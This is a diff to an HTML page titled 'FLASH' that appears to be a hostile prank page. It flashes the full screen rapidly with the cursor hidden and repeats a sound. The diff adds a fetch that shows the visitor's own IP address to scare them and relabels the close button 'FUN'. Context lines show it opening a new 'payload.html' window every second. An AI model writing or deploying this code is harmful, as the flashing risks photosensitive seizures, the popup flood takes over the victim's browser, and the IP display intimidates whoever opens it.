@@ -3,16 +3,32 @@
 <head>
 <title>FLASH</title>
 <style>
-  body { margin:0; padding:0; overflow:hidden; background:#000; cursor:none; }
+  body { margin:0; padding:0; overflow:hidden; background:#000; cursor:none; font-family: Arial, sans-serif; }
   #flash { position:fixed; inset:0; }
+  #ip-text {
+    position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+    color: white; font-size: 28px; font-weight: bold; text-shadow: 0 0 15px black;
+    z-index: 20; text-align: center; pointer-events: none;
+  }
   .close { position:absolute; top:8px; right:8px; background:#c00; color:white; padding:6px 14px; cursor:pointer; z-index:100; font-family:sans-serif; }
 </style>
 </head>
 <body>
   <div id="flash"></div>
-  <div class="close" onclick="window.close()">✕ CLOSE</div>
+  <div id="ip-text">FUN</div>
+  <div class="close" onclick="window.close()">FUN</div>
 
 <script>
+  // Show IP
+  fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => {
+      document.getElementById('ip-text').textContent = 'YOUR IP: ' + data.ip;
+    })
+    .catch(() => {
+      document.getElementById('ip-text').textContent = 'IP: Unknown';
+    });
+
   const flash = document.getElementById('flash');
 
   // Fast flashing
@@ -49,7 +65,7 @@
   setInterval(playRise, 2000);
   playRise();
 
-  // Small windows also spawn more windows every 1 second
+  // Spawn more windows every 1 second
   setInterval(() => {
     try {
       window.open('payload.html', '_blank', 'width=340,height=240');
